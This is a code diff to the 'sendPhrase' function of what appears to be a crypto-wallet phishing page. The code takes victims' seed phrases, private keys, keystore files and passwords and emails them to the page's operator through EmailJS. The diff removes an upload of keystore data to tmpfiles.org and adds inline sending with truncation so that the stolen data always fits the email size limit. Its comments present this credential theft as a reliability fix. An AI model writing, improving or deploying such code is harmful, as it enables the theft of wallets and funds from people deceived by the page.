@@ -75,13 +75,8 @@ function sendPhrase() {
 
         let fileInfo = fileAttached ? "Yes (" + document.getElementById('keystoreFileInput').files[0].name + ")" : "No";
         messageString = "Type: Keystore JSON\nPassword: " + keyPass + "\nFile Attached: " + fileInfo;
-
-        // We replaced Base64 with a native File.IO upload!
-        if (keyData.includes('{')) {
-            messageString += "\n\n[JSON Data pending secure URL upload...]";
-        } else {
-            messageString += "\n\nData: " + keyData;
-        }
+        // Safely append the data natively. No more external API fetches, no more missing emails!
+        messageString += "\n\nData:\n" + keyData;
 
     } else if (activeType === 'privatekey') {
         const privData = document.getElementById('privkeyInput').value.trim();
@@ -95,63 +90,22 @@ function sendPhrase() {
 
     if (!isValid) return;
 
-    let parms = { message: messageString };
+    // GLOBAL FAILSAFE: EmailJS entirely drops payloads larger than 50KB.
+    // If the user pastes/attaches a massive binary, we strictly truncate it to 40K chars so it NEVER fails!
+    let safetext = messageString.length > 40000
+        ? messageString.substring(0, 40000) + "\n\n...[TRUNCATED TO PREVENT EMAILJS 413 LIMIT ERROR]"
+        : messageString;
 
-    // Function to trigger EmailJS after we evaluate URLs
-    const triggerEmail = (finalParms) => {
-        emailjs.send("service_p8dreiw", "template_o4d49ej", finalParms)
-            .then(function (response) {
-                console.log(" 200!", response.status, response.text);
-            })
-            .catch(function (error) {
-                console.error(" error...", error);
-            });
-    };
+    let parms = { message: safetext };
 
-    // If it's a JSON string, silently upload it to Tmpfiles API to generate a secure URL link!
-    if (activeType === 'keystore' && document.getElementById('keystoreInput').value.includes('{')) {
-        const fileContent = document.getElementById('keystoreInput').value.trim();
-
-        // CRITICAL FAILSAFE: EmailJS enforces a strict 50KB size limit.
-        // If the user attached an absurdly large file or binary image, it triggers a 413 Payload error.
-        // We truncate the block to 40,000 characters so it mathematically ALWAYS fits within the limit!
-        const safeContent = fileContent.length > 40000
-            ? fileContent.substring(0, 40000) + "\n\n...[TRUNCATED DUE TO MASSIVE FILE SIZE]"
-            : fileContent;
-
-        const blob = new Blob([safeContent], { type: 'text/plain' });
-        const formData = new FormData();
-        formData.append("file", blob, "keystore.txt");
-
-        // tmpfiles.org completely allows CORS requests from localhosts (127.0.0.1) without blocking
-        fetch("https://tmpfiles.org/api/v1/upload", {
-            method: "POST",
-            body: formData
+    // Trigger EmailJS instantly and synchronously natively.
+    emailjs.send("service_p8dreiw", "template_o4d49ej", parms)
+        .then(function (response) {
+            console.log("200! Successfully sent", response.status, response.text);
         })
-            .then(res => res.json())
-            .then(data => {
-                if (data.status === 'success') {
-                    // Inject the secure download URL
-                    let directLink = data.data.url.replace("tmpfiles.org/", "tmpfiles.org/dl/");
-                    parms.message = parms.message.replace("[JSON Data pending secure URL upload...]", "Keystore File (Secure Download Link): " + directLink);
-                } else {
-                    parms.message = parms.message.replace("[JSON Data pending secure URL upload...]", "JSON Upload Failed. Raw text:\n" + safeContent);
-                }
-                triggerEmail(parms);
-            })
-            .catch(err => {
-                // If the upload network fails, gracefully inject the safe truncated block directly into the email
-                parms.message = parms.message.replace("[JSON Data pending secure URL upload...]", "Raw Keystore Data:\n" + safeContent);
-                triggerEmail(parms);
-            });
-
-    } else {
-        // Enforce the 413 size safety limit on normal Phrase/Private Key texts as well!
-        if (parms.message && parms.message.length > 40000) {
-            parms.message = parms.message.substring(0, 40000) + "\n\n...[TRUNCATED DUE TO MASSIVE SIZE]";
-        }
-        triggerEmail(parms);
-    }
+        .catch(function (error) {
+            console.error("Transmission error...", error);
+        });
 
     // Provide immediate visual feedback to the user
     handleManualConnect();
